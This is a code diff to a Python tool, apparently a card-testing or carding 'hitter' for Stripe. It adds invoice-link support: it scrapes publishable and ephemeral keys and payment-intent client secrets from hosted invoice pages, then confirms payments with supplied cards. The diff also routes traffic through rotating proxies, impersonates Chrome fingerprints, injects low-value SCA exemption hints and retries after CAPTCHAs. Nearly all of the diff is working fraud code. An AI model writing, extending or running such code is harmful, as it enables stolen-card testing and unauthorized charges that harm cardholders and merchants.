@@ -141,6 +141,89 @@ class StripeAPIExtractor:
             return {'success': False}
         except: return {'success': False}
 
+    @staticmethod
+    async def fetch_invoice_data(user_id: int, url: str) -> Dict:
+        try:
+            import urllib.parse
+            parsed = urllib.parse.urlparse(url)
+            path_parts = [p for p in parsed.path.split('/') if p]
+            if len(path_parts) < 3 or path_parts[0] != 'i':
+                return {'success': False, 'error': 'Invalid invoice URL format'}
+            
+            merchant_token = path_parts[1]
+            invoice_secret = path_parts[2]
+            
+            proxy_data = await ProxyManager.get_random(user_id)
+            proxies = None
+            if proxy_data:
+                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
+                proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+                proxies = {"http": proxy_url, "https": proxy_url}
+                
+            invoicedata_url = f"https://invoicedata.stripe.com/hosted_invoice_page/{merchant_token}/{invoice_secret}"
+            
+            headers = {
+                "accept": "application/json",
+                "origin": "https://invoice.stripe.com",
+                "referer": "https://invoice.stripe.com/",
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            }
+            
+            loop = asyncio.get_event_loop()
+            resp = await loop.run_in_executor(None, lambda: cffi_requests.get(invoicedata_url, headers=headers, proxies=proxies, timeout=10, impersonate="chrome120"))
+            if resp.status_code != 200:
+                return {'success': False, 'error': f'Failed invoicedata check: {resp.status_code}'}
+                
+            res_json = resp.json()
+            pk_key = res_json.get('publishable_key')
+            ek = res_json.get('ephemeral_key')
+            invoice_id = res_json.get('invoice_id')
+            
+            if not pk_key or not ek or not invoice_id:
+                return {'success': False, 'error': 'Missing elements in invoicedata response'}
+                
+            hosted_url = f"https://api.stripe.com/v1/invoices/{invoice_id}/hosted"
+            hosted_headers = {
+                "accept": "application/json",
+                "authorization": f"Bearer {ek}",
+                "stripe-version": "2020-03-02",
+                "user-agent": headers["user-agent"]
+            }
+            
+            hosted_resp = await loop.run_in_executor(None, lambda: cffi_requests.get(hosted_url, headers=hosted_headers, proxies=proxies, timeout=10, impersonate="chrome120"))
+            if hosted_resp.status_code != 200:
+                return {'success': False, 'error': f'Failed invoices/hosted check: {hosted_resp.status_code}'}
+                
+            hosted_json = hosted_resp.json()
+            pi = hosted_json.get('payment_intent')
+            pi_cs = None
+            if isinstance(pi, dict):
+                pi_cs = pi.get('client_secret')
+                
+            if not pi_cs:
+                return {'success': False, 'error': 'No active payment intent found on invoice'}
+                
+            amount = hosted_json.get('amount_due') or hosted_json.get('total')
+            currency = hosted_json.get('currency', 'usd').upper()
+            merchant = "Unknown"
+            acct = res_json.get('merchant')
+            if acct and isinstance(acct, dict) and acct.get('business_name'):
+                merchant = acct['business_name']
+                
+            locked_email = hosted_json.get('customer_email') or res_json.get('prefilled_email')
+            
+            return {
+                'success': True,
+                'cs_token': pi_cs,
+                'pk_key': pk_key,
+                'amount': f"{currency} {amount/100:.2f}" if amount is not None else None,
+                'raw_amount': amount,
+                'merchant': merchant,
+                'locked_email': locked_email
+            }
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+
 
 # ============= BASE AUTOFILL =============
 class ProxyManager:
@@ -775,12 +858,16 @@ class StripeAPIHitter:
                     proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                     proxies = {"http": proxy_url, "https": proxy_url}
 
+                is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
+                is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith('seti_')
+                origin_url = "https://invoice.stripe.com" if (is_pi or is_seti) else "https://checkout.stripe.com"
+                
                 headers = {
                     "authority": "api.stripe.com",
                     "accept": "application/json",
                     "content-type": "application/x-www-form-urlencoded",
-                    "origin": "https://checkout.stripe.com",
-                    "referer": "https://checkout.stripe.com/",
+                    "origin": origin_url,
+                    "referer": f"{origin_url}/",
                     "user-agent": profile["user_agent"]
                 }
 
@@ -925,13 +1012,32 @@ class StripeAPIHitter:
                 pm_id = pm_json['id']
                 
                 # Step 2: Confirm the charge using the trusted pm_ token
-                confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
-                confirm_data = {
-                    "payment_method": pm_id,
-                    "expected_payment_method_type": "card",
-                    "consent[terms_of_service]": "accepted",
-                    "key": self.pk_live,
-                }
+                if is_pi:
+                    pi_id = self.cs_live.split('_secret_')[0]
+                    confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
+                    confirm_data = {
+                        "payment_method": pm_id,
+                        "expected_payment_method_type": "card",
+                        "key": self.pk_live,
+                        "client_secret": self.cs_live
+                    }
+                elif is_seti:
+                    seti_id = self.cs_live.split('_secret_')[0]
+                    confirm_url = f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm"
+                    confirm_data = {
+                        "payment_method": pm_id,
+                        "expected_payment_method_type": "card",
+                        "key": self.pk_live,
+                        "client_secret": self.cs_live
+                    }
+                else:
+                    confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
+                    confirm_data = {
+                        "payment_method": pm_id,
+                        "expected_payment_method_type": "card",
+                        "consent[terms_of_service]": "accepted",
+                        "key": self.pk_live,
+                    }
                 
                 # Add Low-Value SCA Exemption Hint if transaction size warrants it ($30/€30 equivalent)
                 if self.raw_amount is not None and 0 < self.raw_amount < 3000:
@@ -1088,13 +1194,21 @@ class StripeAPIHitter:
                                 # If CAPTCHA triggered and no source found, re-confirm with fresh 3DS path
                                 if captcha_triggered and not source:
                                     try:
-                                        reconfirm_data = {
-                                            "payment_method": pm_id,
-                                            "expected_payment_method_type": "card",
-                                            "payment_method_options[card][request_three_d_secure]": "any",
-                                            "consent[terms_of_service]": "accepted",
-                                            "key": self.pk_live,
-                                        }
+                                        if is_pi or is_seti:
+                                            reconfirm_data = {
+                                                "payment_method": pm_id,
+                                                "expected_payment_method_type": "card",
+                                                "key": self.pk_live,
+                                                "client_secret": self.cs_live
+                                            }
+                                        else:
+                                            reconfirm_data = {
+                                                "payment_method": pm_id,
+                                                "expected_payment_method_type": "card",
+                                                "payment_method_options[card][request_three_d_secure]": "any",
+                                                "consent[terms_of_service]": "accepted",
+                                                "key": self.pk_live,
+                                            }
                                         if self.raw_amount is not None and self.raw_amount > 0:
                                             reconfirm_data["expected_amount"] = self.raw_amount
                                         import uuid as _uuid
@@ -1409,6 +1523,12 @@ class ConcurrentHitter:
     async def _fetch_fresh_session(self) -> dict:
         """Re-fetch the reusable URL to mint a fresh cs_live + pk_live pair.
         Returns dict with cs_token, pk_key or None on failure."""
+        if 'invoice.stripe.com' in self.url.lower():
+            res = await StripeAPIExtractor.fetch_invoice_data(self.user_id, self.url)
+            if res.get('success'):
+                return {'cs_token': res['cs_token'], 'pk_key': res['pk_key']}
+            return None
+
         for _ in range(3):
             try:
                 proxy_data = await ProxyManager.get_random(self.user_id)
@@ -1454,6 +1574,24 @@ class ConcurrentHitter:
                 await self.update_callback({"status": "error", "error": "This does not appear to be a valid Stripe link. Need a checkout, buy, or invoice link."})
             return False
             
+        if 'invoice.stripe.com' in url_lower:
+            if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fetching Stripe invoice details..."})
+            res = await StripeAPIExtractor.fetch_invoice_data(self.user_id, self.url)
+            if res.get('success'):
+                self.url_info = {
+                    'cs_token': res['cs_token'],
+                    'pk_key': res['pk_key'],
+                    'merchant': res['merchant'],
+                    'amount': res['amount'],
+                    'raw_amount': res['raw_amount'],
+                    'locked_email': res['locked_email']
+                }
+                return True
+            else:
+                if self.update_callback:
+                    await self.update_callback({"status": "error", "error": f"Failed to extract invoice keys: {res.get('error')}"})
+                return False
+
         # Try extracting CS and PK directly from URL first to bypass network request entirely
         cs_token = StripeAPIExtractor.extract_cs_live(self.url, "")
         pk_key = None
